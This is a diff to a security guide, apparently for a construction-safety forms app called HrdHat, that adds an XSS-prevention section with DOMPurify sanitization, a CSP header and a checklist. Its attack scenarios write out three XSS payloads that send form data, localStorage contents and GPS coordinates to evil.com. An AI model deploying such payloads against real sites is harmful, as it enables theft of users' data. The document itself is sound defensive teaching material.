@@ -16,10 +16,230 @@ In HrdHat, all authentication is managed via **Supabase Auth**.
 - **No Manual Handling**: There's no need to manage tokens or cookies manually; the Supabase client handles refresh and expiration
 - **Session Restoration**: On app reload, the Supabase client restores the session if the token is present
 
-#### XSS Protection
+---
 
-- **Input Sanitization**: Always sanitize any user-generated HTML or markdown before rendering it in the UI
-- **Trusted Libraries**: Use trusted libraries (e.g. DOMPurify) to avoid XSS attacks
+## 🛡️ **XSS (Cross-Site Scripting) Protection**
+
+XSS is a critical security vulnerability where attackers inject malicious JavaScript code that gets executed in users' browsers. For HrdHat, this is especially dangerous since we handle sensitive construction site data.
+
+### **What is XSS?**
+
+XSS occurs when user input is displayed without proper sanitization:
+
+```typescript
+// ❌ DANGEROUS: User enters this in a form field
+const userInput = '<script>alert("Hacked!")</script>';
+
+// ❌ DANGEROUS: Direct display executes the script
+return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
+
+// ✅ SAFE: React automatically escapes
+return <div>{userInput}</div>; // Shows the text, doesn't execute
+```
+
+### **HrdHat XSS Attack Scenarios**
+
+#### **Scenario 1: Malicious Project Name**
+
+```typescript
+// Attacker enters this as project name:
+projectName: '<script>fetch("/api/forms").then(r=>r.json()).then(data=>fetch("https://evil.com/steal", {method:"POST", body:JSON.stringify(data)}))</script>';
+
+// If not properly handled, this could steal all form data when displayed
+```
+
+#### **Scenario 2: Malicious Task Description**
+
+```typescript
+// In Task/Hazard/Control module:
+task: '<img src="x" onerror="document.location=\'https://evil.com/steal?data=\'+btoa(localStorage.getItem(\'formData\'))">';
+
+// Could steal locally stored form data
+```
+
+#### **Scenario 3: Signature/Photo Metadata**
+
+```typescript
+// Malicious photo caption:
+caption: '<script>navigator.sendBeacon("https://evil.com/location", JSON.stringify({lat: position.coords.latitude, lng: position.coords.longitude}))</script>';
+
+// Could steal GPS coordinates from construction sites
+```
+
+### **Why XSS is Critical for HrdHat**
+
+#### **Sensitive Data at Risk**
+
+- **Construction site locations** (GPS coordinates)
+- **Worker names and signatures** (personal information)
+- **Safety assessment data** (could be used maliciously)
+- **Company information** (competitive intelligence)
+- **Form templates** (business processes)
+
+#### **Construction Site Context**
+
+- **Shared devices**: Multiple workers use same tablets
+- **Offline storage**: Malicious scripts could access localStorage
+- **Safety implications**: Corrupted safety data could cause accidents
+
+### **XSS Prevention Implementation**
+
+#### **1. Input Sanitization**
+
+```typescript
+import DOMPurify from 'dompurify';
+
+// Sanitize all user input before storing
+const sanitizeInput = (input: string): string => {
+  return DOMPurify.sanitize(input, {
+    ALLOWED_TAGS: [], // No HTML tags allowed
+    ALLOWED_ATTR: [], // No attributes allowed
+  });
+};
+
+// Use in form handlers
+const handleProjectNameChange = (value: string) => {
+  const sanitized = sanitizeInput(value);
+  setFormData(prev => ({
+    ...prev,
+    generalInfo: { ...prev.generalInfo, projectName: sanitized },
+  }));
+};
+```
+
+#### **2. Content Security Policy (CSP)**
+
+```typescript
+// In your HTML head or server headers
+const cspHeader = `
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' https://supabase.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: blob: https://supabase.com;
+  connect-src 'self' https://supabase.com;
+  font-src 'self';
+  object-src 'none';
+  base-uri 'self';
+  form-action 'self';
+  frame-ancestors 'none';
+`;
+```
+
+#### **3. Safe React Rendering**
+
+```typescript
+// ✅ SAFE: React automatically escapes
+const TaskDisplay = ({ task }) => (
+  <div>{task.description}</div> // Automatically escaped
+);
+
+// ❌ DANGEROUS: Direct HTML injection
+const TaskDisplay = ({ task }) => (
+  <div dangerouslySetInnerHTML={{ __html: task.description }} />
+);
+
+// ✅ SAFE: If you need HTML, sanitize first
+const TaskDisplay = ({ task }) => (
+  <div dangerouslySetInnerHTML={{
+    __html: DOMPurify.sanitize(task.description)
+  }} />
+);
+```
+
+#### **4. JSONB Storage Protection**
+
+```typescript
+// Sanitize before storing in Supabase
+const saveFormData = async (formData: FormData) => {
+  const sanitizedData = {
+    ...formData,
+    modules: {
+      generalInfo: {
+        projectName: sanitizeInput(formData.modules.generalInfo.projectName),
+        taskLocation: sanitizeInput(formData.modules.generalInfo.taskLocation),
+        supervisorName: sanitizeInput(
+          formData.modules.generalInfo.supervisorName
+        ),
+        todaysTask: sanitizeInput(formData.modules.generalInfo.todaysTask),
+      },
+      taskHazardControl: {
+        entries: formData.modules.taskHazardControl.entries.map(entry => ({
+          task: sanitizeInput(entry.task),
+          hazard: sanitizeInput(entry.hazard),
+          control: sanitizeInput(entry.control),
+          hazardRisk: entry.hazardRisk, // Numbers are safe
+          controlRisk: entry.controlRisk,
+        })),
+      },
+    },
+  };
+
+  await supabase.from('form_instances').insert(sanitizedData);
+};
+```
+
+#### **5. Complete XSS-Safe Form Handler**
+
+```typescript
+// Complete XSS-safe form handler for HrdHat
+const useFormSecurity = () => {
+  const sanitizeFormData = (data: any): any => {
+    if (typeof data === 'string') {
+      return DOMPurify.sanitize(data, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] });
+    }
+    if (Array.isArray(data)) {
+      return data.map(sanitizeFormData);
+    }
+    if (typeof data === 'object' && data !== null) {
+      const sanitized: any = {};
+      for (const [key, value] of Object.entries(data)) {
+        sanitized[key] = sanitizeFormData(value);
+      }
+      return sanitized;
+    }
+    return data; // Numbers, booleans, null are safe
+  };
+
+  const saveSecurely = async (formData: FormData) => {
+    const sanitized = sanitizeFormData(formData);
+    await supabase.from('form_instances').insert(sanitized);
+  };
+
+  return { sanitizeFormData, saveSecurely };
+};
+```
+
+### **XSS Prevention Checklist for HrdHat**
+
+#### **✅ Input Validation**
+
+- [ ] Sanitize all text inputs before storage
+- [ ] Validate file uploads (photos, signatures)
+- [ ] Limit input lengths (prevent buffer overflow)
+- [ ] Whitelist allowed characters where possible
+
+#### **✅ Output Encoding**
+
+- [ ] Use React's automatic escaping (avoid `dangerouslySetInnerHTML`)
+- [ ] Sanitize any dynamic HTML content
+- [ ] Encode data in PDF generation
+- [ ] Escape data in API responses
+
+#### **✅ Security Headers**
+
+- [ ] Implement Content Security Policy
+- [ ] Set X-Frame-Options to prevent clickjacking
+- [ ] Use HTTPS everywhere
+- [ ] Set secure cookie flags
+
+#### **✅ Storage Security**
+
+- [ ] Sanitize data before JSONB storage
+- [ ] Validate data when reading from storage
+- [ ] Encrypt sensitive data at rest
+- [ ] Regular security audits of stored data
+
+---
 
 ### Handling User Data (Frontend State)
 
@@ -113,7 +333,7 @@ USING (created_by = auth.uid());
 ### 🛡️ Frontend Security Measures
 
 ```typescript
-// Example: Sanitizing user input
+// Example: Sanitizing user input with DOMPurify
 import DOMPurify from 'dompurify';
 
 const sanitizedContent = DOMPurify.sanitize(userGeneratedContent);
@@ -129,6 +349,26 @@ const UserDashboard = () => {
       {userRole === 'SUPERVISOR' && <SupervisorTools />}
       <UserForms />
     </div>
+  );
+};
+
+// Example: Secure form input handling
+const SecureFormInput = ({ value, onChange, fieldName }) => {
+  const handleChange = (e) => {
+    const sanitized = DOMPurify.sanitize(e.target.value, {
+      ALLOWED_TAGS: [],
+      ALLOWED_ATTR: []
+    });
+    onChange(fieldName, sanitized);
+  };
+
+  return (
+    <input
+      type="text"
+      value={value}
+      onChange={handleChange}
+      maxLength={500} // Prevent buffer overflow
+    />
   );
 };
 ```
